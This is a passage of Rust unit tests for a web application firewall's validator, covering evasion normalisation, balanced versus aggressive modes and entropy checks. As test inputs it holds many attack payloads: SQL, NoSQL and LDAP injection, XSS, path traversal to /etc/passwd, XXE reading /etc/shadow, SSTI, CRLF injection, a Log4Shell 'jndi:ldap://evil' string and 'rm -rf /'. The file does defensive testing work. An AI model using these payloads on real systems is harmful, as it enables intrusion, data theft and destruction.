    fn strip_sql_comments_nested_content() {
        assert_eq!(
            strip_sql_comments(std::borrow::Cow::Borrowed(b"union/*hack*/select")).as_ref(),
            b"union select"
        );
    }

    #[test]
    fn whitespace_runs_do_not_evade_patterns() {
        // Padding tokens with extra spaces / tabs must not slip past the
        // single-space patterns — normalize_unified collapses inline
        // whitespace. Each payload matches ONLY after collapsing (the raw,
        // double-spaced form hits no pattern), so this isolates the fix.
        // Command injection (balanced): double space after ';'.
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                br#"{"c":"ls;  cat secret"}"#,
                &strict_profile()
            ),
            WafVerdict::Deny(_)
        ));
        // Tab as the separator's whitespace (real 0x09 byte).
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                b"{\"c\":\"ls;\tcat secret\"}",
                &strict_profile()
            ),
            WafVerdict::Deny(_)
        ));
        // SQLi with a doubled space (aggressive tier holds "union select").
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                br#"{"q":"union  select 1"}"#,
                &aggressive_profile()
            ),
            WafVerdict::Deny(_)
        ));
        // \n is preserved so the newline command-injection patterns still fire.
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                b"{\"c\":\"x\ncat secret\"}",
                &strict_profile()
            ),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn uri_normalizes_iis_and_overlong_encodings() {
        // IIS-style %uXXXX: %u003c -> '<', so %u003cscript trips <script.
        assert!(
            matches!(
                validate_uri("/x?h=%u003cscript%u003e", WafMode::Balanced),
                WafVerdict::Deny(_)
            ),
            "%uXXXX should decode like \\uXXXX"
        );
        // Overlong UTF-8 of '/': ..%c0%af..%c0%af -> ../../ (traversal).
        assert!(
            matches!(
                validate_uri("/x?f=..%c0%af..%c0%afetc/passwd", WafMode::Balanced),
                WafVerdict::Deny(_)
            ),
            "overlong %c0%af should fold to '/'"
        );
    }

    #[test]
    fn disallowed_content_type_is_still_scanned_when_lenient() {
        // deny_unknown_content_types = false must NOT forward a body unscanned:
        // an injection in a mislabelled (text/html) body is still caught.
        let lenient = WafProfile {
            deny_unknown_content_types: false,
            ..WafProfile::default()
        };
        assert!(
            matches!(
                validate_request("POST", Some("text/html"), b"; cat /etc/passwd", &lenient),
                WafVerdict::Deny(_)
            ),
            "lenient profile must still injection-scan a disallowed content-type"
        );
        // A clean body on a disallowed type is allowed under the lenient policy.
        assert_eq!(
            validate_request("POST", Some("text/html"), b"hello world", &lenient),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_sql_comment_evasion_in_body() {
        // "union/**/select" → "union select" after comment stripping;
        // aggressive-tier pattern now.
        let body = br#"{"q":"union/**/select * from users"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn uri_denies_sql_comment_evasion() {
        assert_eq!(
            validate_uri("/search?q=union/**/select", WafMode::Aggressive),
            WafVerdict::Deny("injection pattern in URI (encoded)")
        );
    }

    #[test]
    fn balanced_allows_demoted_fp_patterns_aggressive_denies() {
        // The e2e bug-hunt flagged these as false positives on real traffic:
        // they no longer fire under the default (balanced) profile, but a
        // strict/admin (aggressive) route still catches them. Regression guard.
        let legit: &[&[u8]] = &[
            br#"{"text":"the trade union select committee met today"}"#,
            br#"{"err":"relation information_schema.columns does not exist"}"#,
            br#"{"url":"ldap://ad.corp.local:389"}"#,
            br#"{"html":"<!doctype html><img src=\"/logo.png\">"}"#,
            br#"{"note":"never assign to __proto__ in JS code"}"#,
        ];
        for body in legit {
            let shown = String::from_utf8_lossy(body);
            assert_eq!(
                validate_request("POST", Some("application/json"), body, &strict_profile()),
                WafVerdict::Allow,
                "balanced should ALLOW legit body: {shown}"
            );
            assert!(
                matches!(
                    validate_request(
                        "POST",
                        Some("application/json"),
                        body,
                        &aggressive_profile()
                    ),
                    WafVerdict::Deny(_)
                ),
                "aggressive should DENY: {shown}"
            );
        }
    }

    // ── JSON unicode escape evasion ──

    #[test]
    fn normalize_json_unicode_basic() {
        // \u0027 = '  (single quote)
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u0027")).as_ref(),
            b"'"
        );
    }

    #[test]
    fn normalize_json_unicode_angle_bracket() {
        // \u003c = <
        assert_eq!(
            normalize_json_unicode(std::borrow::Cow::Borrowed(b"\\u003cscript")).as_ref(),
            b"<script"
        );
    }

    #[test]
    fn denies_json_unicode_xss_in_body() {
        // \\u003c in raw bytes = literal \u003c after normalization
        // Use <script only (no alert) so raw scan doesn't match the literal
        let body = br#"{"html":"\\u003cscript src=x>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    // ── New categories (v0.1.4) ──

    #[test]
    fn aggressive_denies_xss_event_handler_oninput() {
        // `oninput=` is aggressive-only (low-anchor handler, FP-prone in
        // any code-bearing payload). Test pinned under aggressive mode.
        let body = br#"{"html":"<div oninput=alert(1)>"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_img_tag() {
        let body = br#"{"html":"<img src=x onerror=alert(1)>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss_srcdoc() {
        let body = br#"{"html":"<iframe srcdoc=<script>alert(1)</script>>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_xss_innerhtml() {
        // `innerhtml` is aggressive-only (high FP in dev tooling, MDN-style
        // doc snippets, code-paste APIs).
        let body = br#"{"code":"element.innerHTML = userInput"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_gt() {
        // `$gt` (no anchor) is aggressive-only — matches anywhere, including
        // legit strings like `"$gt-23"`. Aggressive mode pins the catch.
        let body = br#"{"username":{"$gt":""},"password":{"$gt":""}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_where() {
        let body = br#"{"$where":"this.password == 'admin'"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_nosql_injection_regex() {
        let body = br#"{"username":{"$regex":".*"}}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_java_deserialization() {
        // Java RCE class-name patterns are aggressive-only because they
        // also appear verbatim in any JVM stack trace forwarded by APMs.
        let body = br#"{"cmd":"Runtime.getRuntime().exec('id')"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_python_deserialization() {
        let body = br#"{"data":"pickle.loads(base64.b64decode(payload))"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_python_os_system() {
        let body = br#"{"cmd":"os.system('rm -rf /')"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_deserialization() {
        let body = br#"{"data":"unserialize($_GET['data'])"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_php_filter_wrapper() {
        let body = br#"{"file":"php://filter/convert.base64-encode/resource=config.php"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn aggressive_denies_graphql_introspection_with_whitespace() {
        // `{__schema` (no space) is in BALANCED — see
        // `denies_graphql_type_probe` which exercises that. With realistic
        // GraphQL formatting (`{ __schema`), the lone `__schema` token is
        // what fires, and that lives in AGGRESSIVE.
        let body = br#"{"query":"{ __schema { types { name } } }"}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_graphql_type_probe() {
        let body = br#"{"query":"{__type(name:\"User\"){fields{name}}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn allows_legitimate_json_with_dollar() {
        // Legitimate JSON with $ in values (MongoDB query syntax in app code is fine)
        let body = br#"{"price":42.99,"currency":"$USD","note":"item costs $5"}"#;
        // $USD and $5 should NOT match $gt/$ne/$regex (those require exact prefix)
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_legitimate_graphql_query() {
        // Normal GraphQL query without introspection
        let body = br#"{"query":"{ users(limit: 10) { id name email } }"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    // ── LDAP / XXE / SSTI / CRLF (v0.1.4b) ──

    #[test]
    fn denies_ldap_injection() {
        let body = br#"{"filter":")(cn=*))"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_entity() {
        let body = br#"{"xml":"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_jinja() {
        let body = br#"{"name":"{{7*7}}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssti_java() {
        let body = b"{\"expr\":\"#{t(java.lang.Runtime).getRuntime()}\"}";
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_crlf_injection() {
        let body = br#"{"header":"value%0d%0aSet-Cookie: admin=true"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xxe_system_file() {
        let body = br#"{"dtd":"SYSTEM \"file:///etc/shadow\""}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xsl_injection() {
        let body = br#"{"xml":"<xsl:stylesheet version=\"1.0\">"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    // ══════════════════════════════════════════════════════════════════
    // NEW CONTRACT (v0.1.7+):
    //   * `Balanced` (default) MUST NOT block legitimate developer / dev
    //     tooling / educational content carrying tokens that the previous
    //     "all-patterns" WAF flagged as attacks (alert(, eval(, $gt, …).
    //   * `Aggressive` keeps the broad coverage for routes that opt in.
    //   * Entropy default 6.5 bits/byte — base64 / JWT must pass; only
    //     near-random / encrypted payloads are flagged.
    //   * `entropy_check = false` is a kill switch.
    // ══════════════════════════════════════════════════════════════════

    #[test]
    fn balanced_allows_legitimate_alert_in_text() {
        // Customer-support comment quoting "alert(" as a literal — the
        // single most common false-positive class with the old WAF.
        let body = br#"{"comment":"the user clicked alert(true) in the broken page"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_allows_eval_and_documentcookie_in_docs() {
        // MDN-style snippet posted to a docs API — would have been blocked
        // by `eval(` and `document.cookie`, both now aggressive-only.
        let body =
            br#"{"snippet":"never trust eval(input) and never read document.cookie directly"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_allows_dollar_prefixed_id() {
        // `$gt-23` would have matched the unanchored `$gt` mongo pattern.
        // Aggressive still blocks; balanced lets through.
        let body = br#"{"id":"$gt-23","tag":"$ne-marker"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn aggressive_still_blocks_dollar_gt() {
        // Inverse of above — confirms aggressive mode keeps detection.
        let body = br#"{"username":{"$gt":""}}"#;
        assert!(matches!(
            validate_request(
                "POST",
                Some("application/json"),
                body,
                &aggressive_profile()
            ),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn balanced_allows_java_stack_trace_payload() {
        // Stack-trace forwarder POSTs Java class names (Runtime.getRuntime,
        // ProcessBuilder, ObjectInputStream). Used to be blocked; now must
        // pass under balanced.
        let body = br#"{"trace":"java.lang.Runtime.getRuntime called from ProcessBuilder via ObjectInputStream"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn balanced_keeps_high_signal_xss_blocking() {
        // Regression guard: balanced mode must STILL block tag-anchored
        // XSS (`<script`), `onerror=` event handler, `javascript:` sink,
        // and CVE-class patterns like `${jndi:`. These are the SOC-grade
        // detections we promise.
        let cases: &[&[u8]] = &[
            br#"{"x":"<script>x</script>"}"#,
            br#"{"x":"<img src=x onerror=foo>"}"#,
            br#"{"x":"javascript:foo()"}"#,
            br#"{"x":"${jndi:ldap://evil/a}"}"#,
            br#"{"x":"' or '1'='1"}"#,
            br#"{"x":"../../../etc/passwd"}"#,
        ];
        for body in cases {
            assert!(
                matches!(
                    validate_request("POST", Some("application/json"), body, &strict_profile()),
                    WafVerdict::Deny(_)
                ),
                "balanced mode must still block: {}",
                std::str::from_utf8(body).unwrap()
            );
        }
    }

    // ── Entropy: new default 6.5 with toggle ──

    /// Build a body of the form `{"k":"<payload>"}` that reaches the
    /// entropy gate (≥256 body bytes, ≥128 string-content bytes).
    fn json_with_string_value(value_bytes: &[u8]) -> Vec<u8> {
        let mut v = Vec::with_capacity(value_bytes.len() + 12);
        v.extend_from_slice(br#"{"k":""#);
        v.extend_from_slice(value_bytes);
        v.extend_from_slice(br#""}"#);
        v
    }

    /// Pseudo-random bytes from a tiny LCG. Self-contained — no rand crate.
    /// Output entropy is close to 8 bits/byte over a 1KB window, so this
    /// reliably exceeds the 6.5 default threshold.
    fn pseudo_random(len: usize, seed: u64) -> Vec<u8> {
        let mut out = Vec::with_capacity(len);
        let mut state = seed.wrapping_add(0x9E3779B97F4A7C15);
        for _ in 0..len {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            out.push((state >> 56) as u8);
        }
        out
    }

    #[test]
    fn balanced_allows_base64_payload_in_json() {
        // Pure-base64 alphabet maxes at 6.0 bits/byte. The old default
        // (5.5) would have blocked any sufficiently long base64. New
        // default 6.5 leaves headroom — so JWTs / signed URLs / image
        // uploads as base64 pass.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let body = json_with_string_value(&payload);
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &strict_profile()),
            WafVerdict::Allow,
            "balanced threshold (6.5) must let base64 through"
        );
    }

    /// Profile that explicitly allows `application/octet-stream` so we
    /// can exercise the entropy gate on raw binary bodies without the
    /// JSON gate (or the unknown-content-type short-circuit) firing.
    fn binary_profile() -> WafProfile {
        WafProfile {
            allowed_content_types: vec!["application/octet-stream".to_string()],
            // Inherit balanced defaults (mode, threshold 6.5, gate on).
            ..WafProfile::default()
        }
    }

    #[test]
    fn balanced_blocks_random_payload_octet_stream() {
        // Test the entropy gate in isolation: octet-stream skips the JSON
        // gate, and `binary_profile` allows the content-type so we don't
        // short-circuit on Gate 2.
        let body = pseudo_random(1024, 0xDEAD_BEEF);
        let v = validate_request(
            "POST",
            Some("application/octet-stream"),
            &body,
            &binary_profile(),
        );
        assert_eq!(
            v,
            WafVerdict::Deny("suspicious payload entropy"),
            "balanced 6.5 threshold must flag near-random payloads, got {v:?}"
        );
    }

    #[test]
    fn entropy_check_disabled_lets_random_through() {
        // Kill switch: `entropy_check = false` skips Gate 4 entirely.
        // Same body that the previous test blocks must now pass.
        let body = pseudo_random(1024, 0xCAFEF00D);
        let mut p = binary_profile();
        p.entropy_check = false;
        assert_eq!(
            validate_request("POST", Some("application/octet-stream"), &body, &p),
            WafVerdict::Allow,
            "entropy_check=false must short-circuit the gate"
        );
    }

    #[test]
    fn entropy_threshold_is_configurable() {
        // Lower the threshold to the legacy 5.5; base64 again gets denied.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let body = json_with_string_value(&payload);
        let mut p = strict_profile();
        p.entropy_threshold = 5.5;
        assert!(matches!(
            validate_request("POST", Some("application/json"), &body, &p),
            WafVerdict::Deny(_)
        ));
    }

    #[test]
    fn entropy_skips_low_string_content_json() {
        // Numeric-heavy JSON has very few string bytes; the JSON-string
        // entropy path returns None and the gate skips. Body is ≥256
        // bytes so the size precondition is met.
        let mut body = Vec::from(&b"{\"data\":["[..]);
        for i in 0..50 {
            if i > 0 {
                body.push(b',');
            }
            body.extend_from_slice(format!("{i}").as_bytes());
        }
        body.extend_from_slice(b"]}");
        // Pad to >= 256 bytes with zero-entropy structural junk OUTSIDE
        // strings, so the byte count is right but string content stays low.
        while body.len() < 300 {
            body.extend_from_slice(b"          ");
        }
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn json_string_entropy_function_distinguishes_payloads() {
        // Direct unit test of the new helper, independent of validate_request.
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut payload = Vec::with_capacity(512);
        for i in 0..512 {
            payload.push(alphabet[i % alphabet.len()]);
        }
        let base64_body = json_with_string_value(&payload);
        let e_b64 = shannon_entropy_json_strings(&base64_body, 128).unwrap();
        assert!(
            e_b64 < 6.5,
            "base64 entropy should be below 6.5 (got {e_b64})"
        );

        let random = pseudo_random(1024, 0x1234_5678);
        let random: Vec<u8> = random
            .into_iter()
            .map(|b| if b == b'"' || b == b'\\' { b'A' } else { b })
            .collect();
        let rand_body = json_with_string_value(&random);
        let e_rand = shannon_entropy_json_strings(&rand_body, 128).unwrap();
        assert!(
            e_rand > 7.0,
            "random-byte entropy should be above 7.0 (got {e_rand})"
        );
    }

    #[test]
    fn json_string_entropy_returns_none_when_undersample() {
        // Tiny string content under min_sample → None.
        let body = br#"{"k":"hi","n":42}"#;
        assert!(shannon_entropy_json_strings(body, 128).is_none());
    }
}
